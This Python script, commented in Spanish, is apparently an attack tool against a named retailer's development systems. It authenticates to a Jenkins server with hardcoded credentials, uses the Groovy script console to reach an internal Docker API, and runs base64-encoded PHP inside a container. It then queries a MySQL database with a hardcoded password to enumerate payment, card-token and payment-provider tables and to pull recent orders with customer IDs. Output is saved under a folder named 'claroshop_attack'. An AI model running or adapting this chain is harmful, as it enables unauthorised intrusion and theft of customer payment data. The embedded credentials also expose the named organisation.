#!/usr/bin/env python3
"""
dev_sears_payment_enum.py — Enumerar tablas de pagos/transacciones en DEV Sears DB
Cadena: Jenkins Groovy (Java HTTP) → Docker exec container PHP → MySQL
Approach: PHP code base64-encoded para evitar escaping hell
"""
import urllib.request, base64, json, urllib.parse, ssl, http.cookiejar, sys, time

sys.stdout.reconfigure(errors='replace')

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
AUTH = base64.b64encode(b'eduardo.cruz:xwMyIxfkZZaDNkFg').decode()
BASE = 'https://jenkins-ng.dev.claroshop.com'

DOCKER_API = 'http://172.27.140.148:4243'
CONTAINER = '5b32e909c295'
MYSQL_HOST = '172.27.141.6'
MYSQL_PORT = 3308
MYSQL_USER = 'apifincadodev'
MYSQL_PASS = '1q2w3e4r5t6y'


def jenkins_exec(script, timeout=300):
    cj = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(
        urllib.request.HTTPCookieProcessor(cj),
        urllib.request.HTTPSHandler(context=ctx))
    req = urllib.request.Request(BASE + '/crumbIssuer/api/json',
                                 headers={'Authorization': 'Basic ' + AUTH})
    crumb = json.loads(opener.open(req, timeout=15).read().decode())
    data = urllib.parse.urlencode({'script': script}).encode()
    req2 = urllib.request.Request(BASE + '/scriptText', data=data,
                                  headers={'Authorization': 'Basic ' + AUTH,
                                           crumb['crumbRequestField']: crumb['crumb']})
    return opener.open(req2, timeout=timeout).read().decode(errors='replace')


def make_php(queries):
    """Generate PHP that runs multiple MySQL queries, outputs JSON."""
    php_lines = [
        "<?php",
        f"$m = new mysqli('{MYSQL_HOST}', '{MYSQL_USER}', '{MYSQL_PASS}', '', {MYSQL_PORT});",
        "if ($m->connect_error) { echo json_encode(['error' => 'CONN: '.$m->connect_error]); exit; }",
        "$m->set_charset('utf8');",
        "$results = [];",
    ]
    for label, db, sql in queries:
        safe_sql = sql.replace("'", "\\'")
        php_lines.append(f"$m->select_db('{db}');")
        php_lines.append(f"$r = $m->query('{safe_sql}');")
        php_lines.append(f"if ($r === false) {{ $results['{label}'] = ['error' => $m->error]; }}")
        php_lines.append(f"elseif ($r === true) {{ $results['{label}'] = ['ok' => true]; }}")
        php_lines.append("else {")
        php_lines.append(f"  $rows = []; while ($row = $r->fetch_assoc()) $rows[] = $row;")
        php_lines.append(f"  $results['{label}'] = $rows;")
        php_lines.append("  $r->free();")
        php_lines.append("}")
    php_lines.append("$m->close();")
    php_lines.append("echo json_encode($results);")
    php_lines.append("?>")
    return "\n".join(php_lines)


def run_php_via_docker(php_code, label="query"):
    """Execute PHP in Docker container via Jenkins Groovy. Returns parsed JSON or raw string."""
    b64 = base64.b64encode(php_code.encode()).decode()
    
    cmd_json = json.dumps(["bash", "-c", f"echo {b64} | base64 -d | php"])
    
    groovy = f'''
import groovy.json.JsonSlurper
import groovy.json.JsonOutput

def docker = "{DOCKER_API}"
def cid = "{CONTAINER}"
def cmdArray = new JsonSlurper().parseText('{cmd_json}')

// Create exec
def createUrl = new URL("${{docker}}/containers/${{cid}}/exec")
def createConn = createUrl.openConnection()
createConn.setRequestMethod("POST")
createConn.setRequestProperty("Content-Type", "application/json")
createConn.setDoOutput(true)
createConn.connectTimeout = 10000
createConn.readTimeout = 60000

def createBody = JsonOutput.toJson([Cmd: cmdArray, AttachStdout: true, AttachStderr: true])
createConn.outputStream.write(createBody.bytes)
createConn.outputStream.flush()

def createResp = createConn.inputStream.text
def execData = new JsonSlurper().parseText(createResp)
def execId = execData.Id

if (!execId) {{
    println "EXEC_CREATE_FAILED: " + createResp
    return
}}

// Start exec  
def startUrl = new URL("${{docker}}/exec/${{execId}}/start")
def startConn = startUrl.openConnection()
startConn.setRequestMethod("POST")
startConn.setRequestProperty("Content-Type", "application/json")
startConn.setDoOutput(true)
startConn.connectTimeout = 10000
startConn.readTimeout = 120000
startConn.outputStream.write('{{"Detach":false,"Tty":false}}'.bytes)
startConn.outputStream.flush()

// Read response - Docker multiplexed stream
def rawBytes = startConn.inputStream.bytes
def output = new StringBuilder()
int pos = 0
while (pos < rawBytes.length) {{
    if (pos + 8 <= rawBytes.length) {{
        int frameLen = ((rawBytes[pos+4] & 0xFF) << 24) | ((rawBytes[pos+5] & 0xFF) << 16) | ((rawBytes[pos+6] & 0xFF) << 8) | (rawBytes[pos+7] & 0xFF)
        if (frameLen > 0 && pos + 8 + frameLen <= rawBytes.length) {{
            output.append(new String(rawBytes, pos + 8, frameLen, "UTF-8"))
            pos += 8 + frameLen
        }} else {{
            output.append(new String(rawBytes, pos, rawBytes.length - pos, "UTF-8"))
            break
        }}
    }} else {{
        output.append(new String(rawBytes, pos, rawBytes.length - pos, "UTF-8"))
        break
    }}
}}
println output.toString()
'''
    
    print(f"  [{time.strftime('%H:%M:%S')}] Executing: {label}...", end=" ", flush=True)
    try:
        raw = jenkins_exec(groovy, timeout=180)
        raw = raw.strip()
        print(f"OK ({len(raw)} bytes)")
        
        try:
            return json.loads(raw)
        except json.JSONDecodeError:
            if raw.startswith('{') or raw.startswith('['):
                clean = raw.split('\n')
                for line in clean:
                    try:
                        return json.loads(line)
                    except:
                        continue
            return {"_raw": raw}
    except Exception as e:
        print(f"FAIL: {e}")
        return {"_error": str(e)}


def main():
    results = {
        "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
        "target": f"{MYSQL_HOST}:{MYSQL_PORT}",
        "databases": ["tienda", "tienda_nueva", "admonplaza", "contadores_pot", "reporte_directivo", "reps_mesa_regalo"],
    }
    
    # ═══════════════════════════════════════════════════════════════════
    # PHASE 1: Tablas de pagos en tienda
    # ═══════════════════════════════════════════════════════════════════
    print("\n" + "█" * 70)
    print("█  PHASE 1: TABLAS DE PAGOS EN 'tienda'")
    print("█" * 70)
    
    php = make_php([
        ("pago", "tienda", "SHOW TABLES FROM tienda LIKE '%pago%'"),
        ("transaccion", "tienda", "SHOW TABLES FROM tienda LIKE '%transaccion%'"),
        ("cargo", "tienda", "SHOW TABLES FROM tienda LIKE '%cargo%'"),
        ("concilia", "tienda", "SHOW TABLES FROM tienda LIKE '%concilia%'"),
        ("payment", "tienda", "SHOW TABLES FROM tienda LIKE '%payment%'"),
        ("orden", "tienda", "SHOW TABLES FROM tienda LIKE '%orden%'"),
        ("pedido", "tienda", "SHOW TABLES FROM tienda LIKE '%pedido%'"),
        ("venta", "tienda", "SHOW TABLES FROM tienda LIKE '%venta%'"),
    ])
    
    phase1 = run_php_via_docker(php, "SHOW TABLES tienda — payment patterns")
    results["phase1_tienda_tables"] = phase1
    
    if isinstance(phase1, dict) and "_error" not in phase1 and "_raw" not in phase1:
        all_tables = set()
        for key, tables in phase1.items():
            if isinstance(tables, list):
                for t in tables:
                    if isinstance(t, dict):
                        for v in t.values():
                            all_tables.add(v)
        print(f"  Found tables: {sorted(all_tables)}")
    
    # ═══════════════════════════════════════════════════════════════════
    # PHASE 2: Tablas de pagos en tienda_nueva
    # ═══════════════════════════════════════════════════════════════════
    print("\n" + "█" * 70)
    print("█  PHASE 2: TABLAS DE PAGOS EN 'tienda_nueva'")
    print("█" * 70)
    
    php = make_php([
        ("pago", "tienda_nueva", "SHOW TABLES FROM tienda_nueva LIKE '%pago%'"),
        ("transaccion", "tienda_nueva", "SHOW TABLES FROM tienda_nueva LIKE '%transaccion%'"),
        ("cargo", "tienda_nueva", "SHOW TABLES FROM tienda_nueva LIKE '%cargo%'"),
        ("concilia", "tienda_nueva", "SHOW TABLES FROM tienda_nueva LIKE '%concilia%'"),
        ("payment", "tienda_nueva", "SHOW TABLES FROM tienda_nueva LIKE '%payment%'"),
        ("orden", "tienda_nueva", "SHOW TABLES FROM tienda_nueva LIKE '%orden%'"),
        ("pedido", "tienda_nueva", "SHOW TABLES FROM tienda_nueva LIKE '%pedido%'"),
    ])
    
    phase2 = run_php_via_docker(php, "SHOW TABLES tienda_nueva — payment patterns")
    results["phase2_tienda_nueva_tables"] = phase2
    
    # ═══════════════════════════════════════════════════════════════════
    # PHASE 3: Tablas tokenizadas / tarjetas
    # ═══════════════════════════════════════════════════════════════════
    print("\n" + "█" * 70)
    print("█  PHASE 3: TABLAS TOKENIZADAS / TARJETAS")
    print("█" * 70)
    
    php = make_php([
        ("token_tienda", "tienda", "SHOW TABLES FROM tienda LIKE '%token%'"),
        ("tarjeta_tienda", "tienda", "SHOW TABLES FROM tienda LIKE '%tarjeta%'"),
        ("card_tienda", "tienda", "SHOW TABLES FROM tienda LIKE '%card%'"),
        ("token_nueva", "tienda_nueva", "SHOW TABLES FROM tienda_nueva LIKE '%token%'"),
        ("tarjeta_nueva", "tienda_nueva", "SHOW TABLES FROM tienda_nueva LIKE '%tarjeta%'"),
        ("card_nueva", "tienda_nueva", "SHOW TABLES FROM tienda_nueva LIKE '%card%'"),
    ])
    
    phase3 = run_php_via_docker(php, "SHOW TABLES — token/tarjeta/card")
    results["phase3_token_tables"] = phase3
    
    # ═══════════════════════════════════════════════════════════════════
    # PHASE 4: Tablas PSP (T1/PayU/CyberSource/NetPay)
    # ═══════════════════════════════════════════════════════════════════
    print("\n" + "█" * 70)
    print("█  PHASE 4: TABLAS PSP (T1/PayU/CyberSource/NetPay)")
    print("█" * 70)
    
    php = make_php([
        ("t1_tienda", "tienda", "SHOW TABLES FROM tienda LIKE '%t1%'"),
        ("payu_tienda", "tienda", "SHOW TABLES FROM tienda LIKE '%payu%'"),
        ("cyber_tienda", "tienda", "SHOW TABLES FROM tienda LIKE '%cyber%'"),
        ("netpay_tienda", "tienda", "SHOW TABLES FROM tienda LIKE '%netpay%'"),
        ("openpay_tienda", "tienda", "SHOW TABLES FROM tienda LIKE '%openpay%'"),
        ("conekta_tienda", "tienda", "SHOW TABLES FROM tienda LIKE '%conekta%'"),
        ("prosa_tienda", "tienda", "SHOW TABLES FROM tienda LIKE '%prosa%'"),
        ("t1_nueva", "tienda_nueva", "SHOW TABLES FROM tienda_nueva LIKE '%t1%'"),
        ("payu_nueva", "tienda_nueva", "SHOW TABLES FROM tienda_nueva LIKE '%payu%'"),
        ("cyber_nueva", "tienda_nueva", "SHOW TABLES FROM tienda_nueva LIKE '%cyber%'"),
        ("netpay_nueva", "tienda_nueva", "SHOW TABLES FROM tienda_nueva LIKE '%netpay%'"),
    ])
    
    phase4 = run_php_via_docker(php, "SHOW TABLES — PSP providers")
    results["phase4_psp_tables"] = phase4
    
    # ═══════════════════════════════════════════════════════════════════
    # PHASE 5: Estructura de pedidos y formas de pago
    # ═══════════════════════════════════════════════════════════════════
    print("\n" + "█" * 70)
    print("█  PHASE 5: ESTRUCTURA PEDIDOS + FORMAS DE PAGO AGOSTO 2026")
    print("█" * 70)
    
    php = make_php([
        ("pedidos_cols", "tienda", "SHOW COLUMNS FROM pedidos"),
        ("formas_pago_cat", "tienda", "SELECT * FROM forma_pago LIMIT 50"),
        ("pedidos_ago_by_fp", "tienda", "SELECT id_forma_pago, COUNT(*) as cnt, SUM(total) as monto_total FROM pedidos WHERE fecha >= '2026-08-01' GROUP BY id_forma_pago ORDER BY cnt DESC"),
        ("pedidos_count_ago", "tienda", "SELECT COUNT(*) as total FROM pedidos WHERE fecha >= '2026-08-01'"),
        ("pedidos_max_fecha", "tienda", "SELECT MAX(fecha) as max_f FROM pedidos"),
    ])
    
    phase5 = run_php_via_docker(php, "pedidos structure + agosto 2026 breakdown")
    results["phase5_pedidos_formas_pago"] = phase5
    
    # ═══════════════════════════════════════════════════════════════════
    # PHASE 6: Sample 50 pedidos recientes
    # ═══════════════════════════════════════════════════════════════════
    print("\n" + "█" * 70)
    print("█  PHASE 6: SAMPLE 50 PEDIDOS RECIENTES")
    print("█" * 70)
    
    php = make_php([
        ("sample_pedidos", "tienda", "SELECT id_pedido, id_forma_pago, total, fecha, estatus, id_cliente FROM pedidos ORDER BY fecha DESC LIMIT 50"),
    ])
    
    phase6 = run_php_via_docker(php, "SELECT 50 pedidos recientes")
    results["phase6_sample_pedidos"] = phase6
    
    # ═══════════════════════════════════════════════════════════════════
    # PHASE 7: Conteos de tablas de pago encontradas
    # ═══════════════════════════════════════════════════════════════════
    print("\n" + "█" * 70)
    print("█  PHASE 7: CONTEOS TABLAS DE PAGO")
    print("█" * 70)
    
    # Collect all found table names from phase1-4
    found_tables = set()
    for phase_data in [phase1, phase2, phase3, phase4]:
        if isinstance(phase_data, dict):
            for key, val in phase_data.items():
                if isinstance(val, list):
                    for row in val:
                        if isinstance(row, dict):
                            for v in row.values():
                                if isinstance(v, str) and v and 'error' not in v.lower():
                                    found_tables.add(v)
    
    if found_tables:
        count_queries = []
        for tbl in sorted(found_tables)[:15]:
            db_guess = 'tienda'
            count_queries.append((f"count_{tbl}", db_guess, f"SELECT COUNT(*) as cnt FROM {tbl}"))
        
        if count_queries:
            php = make_php(count_queries)
            phase7 = run_php_via_docker(php, f"COUNT for {len(count_queries)} tables")
            results["phase7_counts"] = phase7
    
    # ═══════════════════════════════════════════════════════════════════
    # SAVE
    # ═══════════════════════════════════════════════════════════════════
    out_path = r'c:\xampp\htdocs\pentagi\claroshop_attack\dev_sears_payment_tables.json'
    with open(out_path, 'w', encoding='utf-8') as f:
        json.dump(results, f, indent=2, ensure_ascii=False, default=str)
    
    print(f"\n{'█'*70}")
    print(f"█  SAVED: {out_path}")
    print(f"█  Tables found: {len(found_tables)}")
    print(f"█{'█'*69}")
    
    # Print summary
    print("\n\n=== RESUMEN ===")
    print(json.dumps(results.get("phase5_pedidos_formas_pago", {}), indent=2, ensure_ascii=False, default=str)[:3000])


if __name__ == '__main__':
    main()
